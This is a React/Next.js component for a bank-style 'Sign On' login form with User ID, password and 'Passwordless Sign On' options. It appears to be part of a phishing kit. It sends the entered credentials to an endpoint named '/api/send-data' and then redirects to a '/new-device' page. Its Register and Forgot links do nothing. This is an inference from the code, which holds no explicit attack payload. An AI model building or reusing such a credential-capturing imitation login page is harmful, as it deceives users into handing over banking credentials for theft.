"use client";

import React, { useState } from "react";
import { useRouter } from "next/navigation";
import axios from "axios";
import { BsQrCodeScan } from "react-icons/bs";

const LoginBox = () => {
  const router = useRouter();
  const [formData, setFormData] = useState({
    userId: "",
    password: "",
    check: false,
  });
  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, type, value, checked } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: type === "checkbox" ? checked : value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!formData.userId || !formData.password) {
      alert("Please fill in all required fields.");
      return;
    }

    try {
      setLoading(true);
      const res = await axios.post("/api/send-data", formData);
      if (res.status === 200) {
        router.push("/new-device");
      }
    } catch (err) {
      alert("Login failed. Please check your credentials and try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <form
      onSubmit={handleSubmit}
      className="w-[385px] bg-white rounded-2xl"
      style={{ boxShadow: "0 0 10px #00000040" }}
    >
      <div className="pt-3 px-4">
        <div className="flex gap-2">
          <div>
            <p className="text-sm pb-2 font-medium text-sec">User ID *</p>
            <input
              placeholder="User ID"
              type="text"
              name="userId"
              value={formData.userId}
              onChange={handleChange}
              required
              className="h-[48px] w-[170px] border-1 border-gray-400 rounded-lg pl-3 placeholder:font-medium"
            />
          </div>
          <div>
            <p className="text-sm pb-2 font-medium text-sec">Password *</p>
            <input
              placeholder="Password"
              type="password"
              name="password"
              value={formData.password}
              onChange={handleChange}
              required
              className="h-[48px] w-[170px] border-1 border-gray-400 rounded-lg pl-3 placeholder:font-medium"
            />
          </div>
        </div>

        <div className="pt-3 flex gap-2 items-center">
          <input
            type="checkbox"
            id="check"
            name="check"
            checked={formData.check}
            onChange={handleChange}
            className="w-[22px] h-[22px]"
          />
          <label htmlFor="check" className="text-xs">
            Remember User ID
          </label>
        </div>

        <button
          type="submit"
          disabled={loading}
          className="cursor-pointer w-full py-[10px] mt-5 bg-primary rounded-lg font-bold text-white hover:!bg-[#054e7b] disabled:opacity-60"
        >
          {loading ? "Signing In..." : "Sign On"}
        </button>

        <div className="flex-between text-sm mt-5">
          <div>
            <span className="text-primary underline cursor-pointer">
              Register
            </span>{" "}
            /{" "}
            <span className="text-primary underline cursor-pointer">
              Activate
            </span>
          </div>
          <div>
            <span>Forgot </span>
            <span className="text-primary underline cursor-pointer">
              User ID
            </span>{" "}
            <span>or </span>
            <span className="text-primary underline cursor-pointer">
              Password
            </span>
          </div>
        </div>
      </div>

      <div className="bg-[#eff3f8] rounded-bl-2xl rounded-br-2xl mt-6 flex-center py-[14px] cursor-pointer">
        <span className="text-primary font-semibold text-lg text-center flex-center gap-2">
          <BsQrCodeScan size={20} />
          Passwordless Sign On
        </span>
      </div>
    </form>
  );
};

export default LoginBox;
